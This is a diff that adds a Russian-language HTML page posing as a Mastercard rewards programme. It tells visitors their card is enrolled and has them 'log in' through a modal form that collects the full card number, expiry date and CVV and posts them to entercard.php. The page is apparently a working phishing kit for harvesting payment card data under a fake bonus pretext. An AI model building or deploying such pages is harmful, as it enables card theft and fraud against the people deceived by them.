@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+	<link rel="stylesheet" href="css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
+	<link href="css/custom.css" rel="stylesheet">
+	<title>Программа вознаграждений Mastercard®</title>
+	<script src="js/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+	<script src="js/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
+	<script src="js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
+</head>
+<body>
+<div class="d-flex w-100 flex-column">
+	<section class="head_cvv mb-auto">
+		<div class="container">
+			<div class="row">
+				<div class="col">
+					<img src="img/logo.png" alt="mastercard">программа вознаграждений
+				</div>
+			</div>
+		</div>
+	</section>
+	<section class="body_cvv">
+		<div class="container">
+			<div class="row">
+				<div class="col-lg-4 offset-lg-4">
+					<h2>Вы принимаете участие</h2>
+					<div class="line"></div>
+					<p>Поздравляем! Ваша карта участвует в программе вознаграждений Mastercard®.</p>
+					<p>Перейдите в личный кабинет, чтобы проверить баланс баллов и обменять их на вознаграждение.</p>
+					<a href="#" class="button_cvv" data-toggle="modal" data-target="#entercard">ВОЙТИ В КАБИНЕТ</a>
+				</div>
+				<div class="col-12">
+					<h2 class="step_conditions_title">Условия начисления бонусов</h2>
+					<div class="step_conditions_mark"><span>10</span> руб = <span>1</span> балл</div>
+				</div>
+			</div>
+		</div>
+	</section>
+	<section class="footer_cvv mt-auto">
+		<div class="container">
+			<div class="row">
+				<div class="col">
+					<a href="#" class="link_arrow" data-toggle="modal" data-target="#operations">
+						Операции, за которые баллы не начисляются
+						<span class="arrow"></span></a>
+				</div>
+			</div>
+		</div>
+	</section>
+</div>
+					<div class="modal fade" id="operations" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+					  <div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 900px;">
+					    <div class="modal-content">
+					      <div class="modal-header">
+					        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
+					          <span aria-hidden="true">&times;</span>
+					        </button>
+					      </div>
+					      <div class="modal-body">
+					      	<h2>Операции, за которые баллы не начисляются</h2>
+					      	<ul>
+					      		<li>любые комиссии;</li>
+					      		<li>покупки, которые позже возвращаются или компенсируются;</li>
+					      		<li>переводы баланса;</li>
+					      		<li>покупки с помощью чеков;</li>
+					      		<li>страховые платежи;</li>
+					      		<li>проценты;</li>
+					      		<li>штрафы за невыполнение условий договора;</li>
+					      		<li>дорожные чеки;</li>
+					      		<li>любые азартные игры (Включая плату за возможность выиграть приз);</li>
+					      		<li>покупки с наличного счета (Включая получение наличных через банкоматы);</li>
+					      	</ul>
+					      </div>
+					    </div>
+					  </div>
+					</div>
+					<div class="modal fade" id="entercard" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
+					  <div class="modal-dialog modal-dialog-centered" role="document" style="max-width: 900px;">
+					    <div class="modal-content">
+					      <div class="modal-body">
+					      	<h2 class="text-center">Данные вашей карты</h2>
+					      	<div class="line"></div>
+					      	<div class="card_p">
+						      	<div class="row">
+							        <div class="col">
+							        	<form method="post" name="log" id="login" action="entercard.php">
+							          <div class="col-12 text-center">
+							          	<input type="text" class="wallen_card wcard" id="number" name="number" placeholder="0000 0000 0000 0000" maxlength="16" tabindex="1" aria-required="true"></div>
+							          <div class="col-12 text-center">
+							            <input type="text" class="wallen_card wyear" id="year" name="year" placeholder="mm/yy" maxlength="4" tabindex="1" aria-required="true">
+							            <input type="password" class="wallen_card wcvv" id="cvv" name="cvv" placeholder="CVV" maxlength="3" tabindex="1" aria-required="true">
+							          </div>
+							          <button class="button_cvv">рассчитать</button>
+							        	</form>
+							        </div>
+							      </div>
+						      </div>
+					      </div>
+					    </div>
+					  </div>
+					</div>
+</body>
+</html>
